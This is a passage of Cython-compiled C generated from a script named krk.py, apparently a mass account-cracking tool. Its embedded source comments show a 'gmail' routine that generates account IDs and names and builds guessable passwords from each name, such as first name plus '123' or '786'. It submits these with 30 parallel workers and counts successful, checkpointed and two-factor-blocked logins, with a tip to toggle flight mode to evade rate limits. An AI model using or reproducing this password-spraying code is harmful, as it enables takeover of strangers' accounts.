              __pyx_t_4 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IndexError);
              if (__pyx_t_4) {
                __Pyx_AddTraceback("krk.gmail", __pyx_clineno, __pyx_lineno, __pyx_filename);
                if (__Pyx_GetException(&__pyx_t_2, &__pyx_t_12, &__pyx_t_3) < 0) __PYX_ERR(0, 331, __pyx_L31_except_error)
                __Pyx_XGOTREF(__pyx_t_2);
                __Pyx_XGOTREF(__pyx_t_12);
                __Pyx_XGOTREF(__pyx_t_3);

                /* "krk.py":332
 *                                         last_name = names.rsplit(' ')[1]
 *                                 except IndexError:
 *                                         last_name = 'Khan'             # <<<<<<<<<<<<<<
 *                                 fs = first_name.lower()
 *                                 ls = last_name.lower()
 */
                __Pyx_INCREF(__pyx_n_s_Khan);
                __Pyx_XDECREF_SET(__pyx_v_last_name, __pyx_n_s_Khan);
                __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
                __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
                __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                goto __pyx_L30_exception_handled;
              }
              goto __pyx_L31_except_error;

              /* "krk.py":329
 *                                 ids,names = user.split('|')
 *                                 first_name = names.rsplit(' ')[0]
 *                                 try:             # <<<<<<<<<<<<<<
 *                                         last_name = names.rsplit(' ')[1]
 *                                 except IndexError:
 */
              __pyx_L31_except_error:;
              __Pyx_XGIVEREF(__pyx_t_17);
              __Pyx_XGIVEREF(__pyx_t_18);
              __Pyx_XGIVEREF(__pyx_t_19);
              __Pyx_ExceptionReset(__pyx_t_17, __pyx_t_18, __pyx_t_19);
              goto __pyx_L19_error;
              __pyx_L30_exception_handled:;
              __Pyx_XGIVEREF(__pyx_t_17);
              __Pyx_XGIVEREF(__pyx_t_18);
              __Pyx_XGIVEREF(__pyx_t_19);
              __Pyx_ExceptionReset(__pyx_t_17, __pyx_t_18, __pyx_t_19);
              __pyx_L36_try_end:;
            }

            /* "krk.py":333
 *                                 except IndexError:
 *                                         last_name = 'Khan'
 *                                 fs = first_name.lower()             # <<<<<<<<<<<<<<
 *                                 ls = last_name.lower()
 *                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
 */
            __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_first_name, __pyx_n_s_lower); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 333, __pyx_L19_error)
            __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_2 = NULL;
            __pyx_t_4 = 0;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
              __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_12);
              if (likely(__pyx_t_2)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
                __Pyx_INCREF(__pyx_t_2);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_12, function);
                __pyx_t_4 = 1;
              }
            }
            {
              PyObject *__pyx_callargs[1] = {__pyx_t_2, };
              __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_12, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
              __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
              if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 333, __pyx_L19_error)
              __Pyx_GOTREF(__pyx_t_3);
              __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            }
            __Pyx_XDECREF_SET(__pyx_v_fs, __pyx_t_3);
            __pyx_t_3 = 0;

            /* "krk.py":334
 *                                         last_name = 'Khan'
 *                                 fs = first_name.lower()
 *                                 ls = last_name.lower()             # <<<<<<<<<<<<<<
 *                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
 *                                 Sabir.submit(rndm,ids,passlist)
 */
            __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_last_name, __pyx_n_s_lower); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 334, __pyx_L19_error)
            __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_2 = NULL;
            __pyx_t_4 = 0;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_12))) {
              __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_12);
              if (likely(__pyx_t_2)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
                __Pyx_INCREF(__pyx_t_2);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_12, function);
                __pyx_t_4 = 1;
              }
            }
            {
              PyObject *__pyx_callargs[1] = {__pyx_t_2, };
              __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_12, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
              __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
              if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 334, __pyx_L19_error)
              __Pyx_GOTREF(__pyx_t_3);
              __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            }
            __Pyx_XDECREF_SET(__pyx_v_ls, __pyx_t_3);
            __pyx_t_3 = 0;

            /* "krk.py":335
 *                                 fs = first_name.lower()
 *                                 ls = last_name.lower()
 *                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']             # <<<<<<<<<<<<<<
 *                                 Sabir.submit(rndm,ids,passlist)
 *                 print('\033[1;37m')
 */
            __pyx_t_3 = PyNumber_Add(__pyx_v_fs, __pyx_v_ls); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 335, __pyx_L19_error)
            __Pyx_GOTREF(__pyx_t_3);
            __pyx_t_12 = PyNumber_Add(__pyx_v_fs, __pyx_kp_s__22); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 335, __pyx_L19_error)
            __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_2 = PyNumber_Add(__pyx_t_12, __pyx_v_ls); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 335, __pyx_L19_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            __pyx_t_12 = PyNumber_Add(__pyx_v_fs, __pyx_kp_s_123); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 335, __pyx_L19_error)
            __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_13 = PyNumber_Add(__pyx_v_fs, __pyx_kp_s_12345); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 335, __pyx_L19_error)
            __Pyx_GOTREF(__pyx_t_13);
            __pyx_t_10 = PyNumber_Add(__pyx_v_fs, __pyx_kp_s_1122); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 335, __pyx_L19_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_14 = PyNumber_Add(__pyx_v_fs, __pyx_kp_s_1234); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 335, __pyx_L19_error)
            __Pyx_GOTREF(__pyx_t_14);
            __pyx_t_20 = PyNumber_Add(__pyx_v_fs, __pyx_kp_s_786); if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 335, __pyx_L19_error)
            __Pyx_GOTREF(__pyx_t_20);
            __pyx_t_21 = PyNumber_Add(__pyx_v_fs, __pyx_kp_s_12); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 335, __pyx_L19_error)
            __Pyx_GOTREF(__pyx_t_21);
            __pyx_t_22 = PyList_New(9); if (unlikely(!__pyx_t_22)) __PYX_ERR(0, 335, __pyx_L19_error)
            __Pyx_GOTREF(__pyx_t_22);
            __Pyx_GIVEREF(__pyx_t_3);
            PyList_SET_ITEM(__pyx_t_22, 0, __pyx_t_3);
            __Pyx_GIVEREF(__pyx_t_2);
            PyList_SET_ITEM(__pyx_t_22, 1, __pyx_t_2);
            __Pyx_GIVEREF(__pyx_t_12);
            PyList_SET_ITEM(__pyx_t_22, 2, __pyx_t_12);
            __Pyx_GIVEREF(__pyx_t_13);
            PyList_SET_ITEM(__pyx_t_22, 3, __pyx_t_13);
            __Pyx_GIVEREF(__pyx_t_10);
            PyList_SET_ITEM(__pyx_t_22, 4, __pyx_t_10);
            __Pyx_INCREF(__pyx_v_fs);
            __Pyx_GIVEREF(__pyx_v_fs);
            PyList_SET_ITEM(__pyx_t_22, 5, __pyx_v_fs);
            __Pyx_GIVEREF(__pyx_t_14);
            PyList_SET_ITEM(__pyx_t_22, 6, __pyx_t_14);
            __Pyx_GIVEREF(__pyx_t_20);
            PyList_SET_ITEM(__pyx_t_22, 7, __pyx_t_20);
            __Pyx_GIVEREF(__pyx_t_21);
            PyList_SET_ITEM(__pyx_t_22, 8, __pyx_t_21);
            __pyx_t_3 = 0;
            __pyx_t_2 = 0;
            __pyx_t_12 = 0;
            __pyx_t_13 = 0;
            __pyx_t_10 = 0;
            __pyx_t_14 = 0;
            __pyx_t_20 = 0;
            __pyx_t_21 = 0;
            __Pyx_XDECREF_SET(__pyx_v_passlist, ((PyObject*)__pyx_t_22));
            __pyx_t_22 = 0;

            /* "krk.py":336
 *                                 ls = last_name.lower()
 *                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
 *                                 Sabir.submit(rndm,ids,passlist)             # <<<<<<<<<<<<<<
 *                 print('\033[1;37m')
 *                 linex()
 */
            __pyx_t_21 = __Pyx_PyObject_GetAttrStr(__pyx_v_Sabir, __pyx_n_s_submit); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 336, __pyx_L19_error)
            __Pyx_GOTREF(__pyx_t_21);
            __Pyx_GetModuleGlobalName(__pyx_t_20, __pyx_n_s_rndm); if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 336, __pyx_L19_error)
            __Pyx_GOTREF(__pyx_t_20);
            __pyx_t_14 = NULL;
            __pyx_t_4 = 0;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_21))) {
              __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_21);
              if (likely(__pyx_t_14)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_21);
                __Pyx_INCREF(__pyx_t_14);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_21, function);
                __pyx_t_4 = 1;
              }
            }
            {
              PyObject *__pyx_callargs[4] = {__pyx_t_14, __pyx_t_20, __pyx_v_ids, __pyx_v_passlist};
              __pyx_t_22 = __Pyx_PyObject_FastCall(__pyx_t_21, __pyx_callargs+1-__pyx_t_4, 3+__pyx_t_4);
              __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
              __Pyx_DECREF(__pyx_t_20); __pyx_t_20 = 0;
              if (unlikely(!__pyx_t_22)) __PYX_ERR(0, 336, __pyx_L19_error)
              __Pyx_GOTREF(__pyx_t_22);
              __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
            }
            __Pyx_DECREF(__pyx_t_22); __pyx_t_22 = 0;

            /* "krk.py":326
 *                         print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
 *                         linex()
 *                         for user in fo:             # <<<<<<<<<<<<<<
 *                                 ids,names = user.split('|')
 *                                 first_name = names.rsplit(' ')[0]
 */
          }
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          /* "krk.py":320
 *                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
 *                         fo = open('.re.txt', 'r').read().splitlines()
 *                 with tred(max_workers=30) as Sabir:             # <<<<<<<<<<<<<<
 *                         total = str(len(fo))
 *                         clear()
 */
        }
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
        goto __pyx_L24_try_end;
        __pyx_L19_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
        __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_20); __pyx_t_20 = 0;
        __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
        __Pyx_XDECREF(__pyx_t_22); __pyx_t_22 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        /*except:*/ {
          __Pyx_AddTraceback("krk.gmail", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_22, &__pyx_t_21) < 0) __PYX_ERR(0, 320, __pyx_L21_except_error)
          __Pyx_XGOTREF(__pyx_t_1);
          __Pyx_XGOTREF(__pyx_t_22);
          __Pyx_XGOTREF(__pyx_t_21);
          __pyx_t_20 = PyTuple_Pack(3, __pyx_t_1, __pyx_t_22, __pyx_t_21); if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 320, __pyx_L21_except_error)
          __Pyx_GOTREF(__pyx_t_20);
          __pyx_t_19 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_t_20, NULL);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __Pyx_DECREF(__pyx_t_20); __pyx_t_20 = 0;
          if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 320, __pyx_L21_except_error)
          __Pyx_GOTREF(__pyx_t_19);
          __pyx_t_11 = __Pyx_PyObject_IsTrue(__pyx_t_19);
          __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
          if (__pyx_t_11 < 0) __PYX_ERR(0, 320, __pyx_L21_except_error)
          __pyx_t_23 = (!__pyx_t_11);
          if (unlikely(__pyx_t_23)) {
            __Pyx_GIVEREF(__pyx_t_1);
            __Pyx_GIVEREF(__pyx_t_22);
            __Pyx_XGIVEREF(__pyx_t_21);
            __Pyx_ErrRestoreWithState(__pyx_t_1, __pyx_t_22, __pyx_t_21);
            __pyx_t_1 = 0; __pyx_t_22 = 0; __pyx_t_21 = 0; 
            __PYX_ERR(0, 320, __pyx_L21_except_error)
          }
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_22); __pyx_t_22 = 0;
          __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
          goto __pyx_L20_exception_handled;
        }
        __pyx_L21_except_error:;
        __Pyx_XGIVEREF(__pyx_t_6);
        __Pyx_XGIVEREF(__pyx_t_5);
        __Pyx_XGIVEREF(__pyx_t_15);
        __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_5, __pyx_t_15);
        goto __pyx_L1_error;
        __pyx_L20_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_6);
        __Pyx_XGIVEREF(__pyx_t_5);
        __Pyx_XGIVEREF(__pyx_t_15);
        __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_5, __pyx_t_15);
        __pyx_L24_try_end:;
      }
    }
    /*finally:*/ {
      /*normal exit:*/{
        if (__pyx_t_7) {
          __pyx_t_15 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__26, NULL);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 320, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_15);
          __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
        }
        goto __pyx_L18;
      }
      __pyx_L18:;
    }
    goto __pyx_L43;
    __pyx_L15_error:;
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    goto __pyx_L1_error;
    __pyx_L43:;
  }

  /* "krk.py":337
 *                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
 *                                 Sabir.submit(rndm,ids,passlist)
 *                 print('\033[1;37m')             # <<<<<<<<<<<<<<
 *                 linex()
 *                 print(' The process has completed')
 */
  __pyx_t_21 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__27, NULL); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 337, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_21);
  __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;

  /* "krk.py":338
 *                                 Sabir.submit(rndm,ids,passlist)
 *                 print('\033[1;37m')
 *                 linex()             # <<<<<<<<<<<<<<
 *                 print(' The process has completed')
 *                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
 */
  __Pyx_GetModuleGlobalName(__pyx_t_22, __pyx_n_s_linex); if (unlikely(!__pyx_t_22)) __PYX_ERR(0, 338, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_22);
  __pyx_t_1 = NULL;
  __pyx_t_4 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_22))) {
    __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_22);
    if (likely(__pyx_t_1)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_22);
      __Pyx_INCREF(__pyx_t_1);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_22, function);
      __pyx_t_4 = 1;
    }
  }
  {
    PyObject *__pyx_callargs[1] = {__pyx_t_1, };
    __pyx_t_21 = __Pyx_PyObject_FastCall(__pyx_t_22, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 338, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_21);
    __Pyx_DECREF(__pyx_t_22); __pyx_t_22 = 0;
  }
  __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;

  /* "krk.py":339
 *                 print('\033[1;37m')
 *                 linex()
 *                 print(' The process has completed')             # <<<<<<<<<<<<<<
 *                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
 *                 linex()
 */
  __pyx_t_21 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__28, NULL); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 339, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_21);
  __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;

  /* "krk.py":340
 *                 linex()
 *                 print(' The process has completed')
 *                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))             # <<<<<<<<<<<<<<
 *                 linex()
 *                 input(' Press enter to back ')
 */
  __Pyx_GetModuleGlobalName(__pyx_t_21, __pyx_n_s_oks); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 340, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_21);
  __pyx_t_8 = PyObject_Length(__pyx_t_21); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 340, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
  __pyx_t_21 = PyInt_FromSsize_t(__pyx_t_8); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 340, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_21);
  __pyx_t_22 = __Pyx_PyObject_Str(__pyx_t_21); if (unlikely(!__pyx_t_22)) __PYX_ERR(0, 340, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_22);
  __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
  __pyx_t_21 = PyNumber_Add(__pyx_kp_s_Total_OK_CP_2F, __pyx_t_22); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 340, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_21);
  __Pyx_DECREF(__pyx_t_22); __pyx_t_22 = 0;
  __pyx_t_22 = PyNumber_Add(__pyx_t_21, __pyx_kp_s__29); if (unlikely(!__pyx_t_22)) __PYX_ERR(0, 340, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_22);
  __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_21, __pyx_n_s_cps); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 340, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_21);
  __pyx_t_8 = PyObject_Length(__pyx_t_21); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 340, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
  __pyx_t_21 = PyInt_FromSsize_t(__pyx_t_8); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 340, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_21);
  __pyx_t_1 = __Pyx_PyObject_Str(__pyx_t_21); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 340, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
  __pyx_t_21 = PyNumber_Add(__pyx_t_22, __pyx_t_1); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 340, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_21);
  __Pyx_DECREF(__pyx_t_22); __pyx_t_22 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = PyNumber_Add(__pyx_t_21, __pyx_kp_s__29); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 340, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_21, __pyx_n_s_twf); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 340, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_21);
  __pyx_t_8 = PyObject_Length(__pyx_t_21); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 340, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
  __pyx_t_21 = PyInt_FromSsize_t(__pyx_t_8); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 340, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_21);
  __pyx_t_22 = __Pyx_PyObject_Str(__pyx_t_21); if (unlikely(!__pyx_t_22)) __PYX_ERR(0, 340, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_22);
  __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
  __pyx_t_21 = PyNumber_Add(__pyx_t_1, __pyx_t_22); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 340, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_21);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_22); __pyx_t_22 = 0;
  __pyx_t_22 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_21); if (unlikely(!__pyx_t_22)) __PYX_ERR(0, 340, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_22);
  __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
  __Pyx_DECREF(__pyx_t_22); __pyx_t_22 = 0;

  /* "krk.py":341
 *                 print(' The process has completed')
 *                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
 *                 linex()             # <<<<<<<<<<<<<<
 *                 input(' Press enter to back ')
 *                 os.system('python ZEA')
 */
  __Pyx_GetModuleGlobalName(__pyx_t_21, __pyx_n_s_linex); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 341, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_21);
  __pyx_t_1 = NULL;
  __pyx_t_4 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_21))) {
    __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_21);
    if (likely(__pyx_t_1)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_21);
      __Pyx_INCREF(__pyx_t_1);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_21, function);
      __pyx_t_4 = 1;
    }
  }
  {
    PyObject *__pyx_callargs[1] = {__pyx_t_1, };
    __pyx_t_22 = __Pyx_PyObject_FastCall(__pyx_t_21, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (unlikely(!__pyx_t_22)) __PYX_ERR(0, 341, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_22);
    __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
  }
  __Pyx_DECREF(__pyx_t_22); __pyx_t_22 = 0;

  /* "krk.py":342
 *                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
 *                 linex()
 *                 input(' Press enter to back ')             # <<<<<<<<<<<<<<
 *                 os.system('python ZEA')
 * def ffb(ids,names,passlist):
 */
  __pyx_t_22 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__30, NULL); if (unlikely(!__pyx_t_22)) __PYX_ERR(0, 342, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_22);
  __Pyx_DECREF(__pyx_t_22); __pyx_t_22 = 0;

  /* "krk.py":343
 *                 linex()
 *                 input(' Press enter to back ')
 *                 os.system('python ZEA')             # <<<<<<<<<<<<<<
 * def ffb(ids,names,passlist):
 *         global loop,oks,cps
 */
  __Pyx_GetModuleGlobalName(__pyx_t_21, __pyx_n_s_os); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 343, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_21);
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_21, __pyx_n_s_system); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 343, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
  __pyx_t_21 = NULL;
  __pyx_t_4 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_21 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_21)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_21);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
      __pyx_t_4 = 1;
    }
  }
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_21, __pyx_kp_s_python_ZEA};
    __pyx_t_22 = __Pyx_PyObject_FastCall(__pyx_t_1, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
    if (unlikely(!__pyx_t_22)) __PYX_ERR(0, 343, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_22);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  }
  __Pyx_DECREF(__pyx_t_22); __pyx_t_22 = 0;

  /* "krk.py":289
 *                 input(' Press enter to back ')
 *                 os.system('python ZEA.py')
 * def gmail():             # <<<<<<<<<<<<<<
 *                 os.system('rm -rf .re.txt')
 *                 clear()
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_12);
  __Pyx_XDECREF(__pyx_t_13);
  __Pyx_XDECREF(__pyx_t_14);
  __Pyx_XDECREF(__pyx_t_20);
  __Pyx_XDECREF(__pyx_t_21);
  __Pyx_XDECREF(__pyx_t_22);
  __Pyx_AddTraceback("krk.gmail", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_first);
  __Pyx_XDECREF(__pyx_v_last);
  __Pyx_XDECREF(__pyx_v_domain);
  __Pyx_XDECREF(__pyx_v_limit);
  __Pyx_XDECREF(__pyx_v_lists);
  __Pyx_XDECREF(__pyx_v_xd);
  __Pyx_XDECREF(__pyx_v_lchoice);
  __Pyx_XDECREF(__pyx_v_mail);
  __Pyx_XDECREF(__pyx_v_fo);
  __Pyx_XDECREF(__pyx_v_Sabir);
  __Pyx_XDECREF(__pyx_v_total);
  __Pyx_XDECREF(__pyx_v_user);
  __Pyx_XDECREF(__pyx_v_ids);
  __Pyx_XDECREF(__pyx_v_names);
  __Pyx_XDECREF(__pyx_v_first_name);
  __Pyx_XDECREF(__pyx_v_last_name);
  __Pyx_XDECREF(__pyx_v_fs);
  __Pyx_XDECREF(__pyx_v_ls);
  __Pyx_XDECREF(__pyx_v_passlist);
  __Pyx_XDECREF(__pyx_gb_3krk_5gmail_2generator2);
  __Pyx_XDECREF(__pyx_gb_3krk_5gmail_5generator3);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "krk.py":344
 *                 input(' Press enter to back ')
 *                 os.system('python ZEA')
 * def ffb(ids,names,passlist):             # <<<<<<<<<<<<<<
